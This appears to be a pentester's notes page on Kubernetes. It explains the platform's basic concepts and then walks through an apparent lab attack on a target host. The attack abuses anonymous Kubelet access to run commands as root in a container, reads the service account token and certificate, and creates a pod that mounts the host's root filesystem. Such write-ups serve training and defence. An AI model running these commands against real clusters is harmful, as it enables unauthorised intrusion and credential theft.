---
description: >-
  Developed by Google, Kubernetes leverages over a decade of experience in
  running complex workloads.
---

# Kubernetes

{% embed url="https://www.youtube.com/watch?ab_channel=GoogleCloudTech&v=cC46cg5FFAM" %}
What is Kubernetes
{% endembed %}

### What is Kubernetes or K8s

Kubernetes is a portable, extensible and open source platform for managing containerized workloads and services. It is a container orchestration system which functions by runnnig applications in containers isolated from the host system. Originally developed by Google, it is now maintained by the Cloud Native Computing Foundation (CNCF)

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption><p>Image from: <a href="https://www.opsramp.com/guides/why-kubernetes/kubernetes-architecture/">https://www.opsramp.com/guides/why-kubernetes/kubernetes-architecture/</a></p></figcaption></figure>

### Container Orchestrator

Kubernetes makes sure each container is where it supposed to be and the containers can work together. It takes care of running services the way an app developer wants them to run. Kubernetes orchestrates these containers across multiple hosts, helping manage the lifecycle, networking, and distribution of containers to optimize resource use.

{% hint style="info" %}
#### For terms checkout the Kubernetes cheat sheet. https://kubernetes.io/docs/reference/kubectl/cheatsheet/
{% endhint %}

#### -- Cluster

Is a set of machines individually referred to as nodes used to run containerized applications managed by Kubernetes.

#### -- Pod:

Is a single container or a set of containers running on a Kubernetes cluster. It can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details.

#### -- Nodes&#x20;

Is either a virtual or physical machine. A cluster consists of a master node and a number of worker nodes. The master node hosts the Kubernetes Control Plane, which manages and coordinates all activities within the cluster, the Minions execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.

* `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster.
* `The Worker Nodes` (minions), where the containerized applications are run.

## Kubernetes API

The core of Kubernetes architecture is its API, it serves for all internal and external interactions. It  allows users to define their desired state for a system. The Kubernetes API facilitates communication and control within the Kubernetes cluster.&#x20;

In Kubernetes, an API resource acts as an endpoint containing a specific set of API objects related to a particular type, such as Pods, Services, and Deployments. Each resource type has a unique set of actions that can be performed like:

* `GET`  Retrieve information.
* `POST`  Create new resource
* `PUT` update a resource
* `PATCH` partial update to resource
* `DELETE` delete a resource

### Authentication

{% hint style="info" %}
In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`.
{% endhint %}

Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth. Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (`RBAC`).&#x20;

#### Interact with K8's API server

{% code overflow="wrap" %}
```bash
# System:anonymous means unauthenticated user, no valid credentials or are trying to access the API server anonymously.
$ curl https://10.10.11.133:8443 -k
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}        
```
{% endcode %}

#### Extracting Pods using the Kubelet API

`curl https://10.10.11.133:10250/pods -k | jq .` will extract names, namespaces, creation timestamps and container images. Finding container images and their versions can help us identify know vulnerabilities and exploit them.

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

### Extracting Pods with **Kubeletctl**&#x20;

`kubeletctl` is a command-line tool used to interact with the Kubelet API on Kubernetes nodes.



The command `kubeletctl -i --server 10.129.10.11 pods` is used to list all pods running on a specific Kubernetes node by directly querying the Kubelet API on that node.

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

&#x20;Using  `kubeletctl -i --server 10.129.10.11 scan rce`  we can check if we have remote code execution over any of the containers.&#x20;

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Trying the nginx container we got RCE.

```bash
kubeletctl -i --server 10.10.11.133 exec "id" -p nginx  -c nginx         
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation

To gain acces to the host system by gaining higher privileges we can obatin the service account's token and certificate (ca.crt) using [kubeletctl](https://github.com/cyberark/kubeletctl). With that we can set up a volume mount to attach the entire root filesystem from the host system

{% code overflow="wrap" %}
```bash
# Get latest version
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

# Chmod
chmod +x kubectl

# Move to PATH
sudo mv kubectl /usr/local/bin/
```
{% endcode %}

#### Extracting tokens

```bash
# Get token
$ kubeletctl -i --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token                                                                                                                                                                                                              
```

#### Extracting Certifcates

```bash
# Get certificate
$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

#### List privileges

{% code overflow="wrap" %}
```bash
# Export token as variable
$ export token=`cat k8.token`
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption><p>We have permission to create a pod. </p></figcaption></figure>

We have permissions to get, create, and list pods, which represent the running containers within the cluster. From this point, we can create a YAML configuration file to define a new container. In this configuration, we can set up a volume mount to attach the entire root filesystem from the host system into the `/root` directory of the container.

<details>

<summary>yaml file</summary>

{% code overflow="wrap" %}
```bash
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
{% endcode %}

</details>

Upload the yaml file using:

```bash
# upload the yaml file
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f PE.yaml
pod/privesc created

# Check if its running
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods
NAME      READY   STATUS    RESTARTS   AGE
nginx     1/1     Running   0          6h14m
privesc   1/1     Running   0          87s
```

And finally we can read contents from host root directory

```bash
$ kubeletctl --server 10.10.11.133 exec "cat /root/root/root.txt" -p privesc -c privesc
e189181488a148esdfdsfsd7909f405579
```

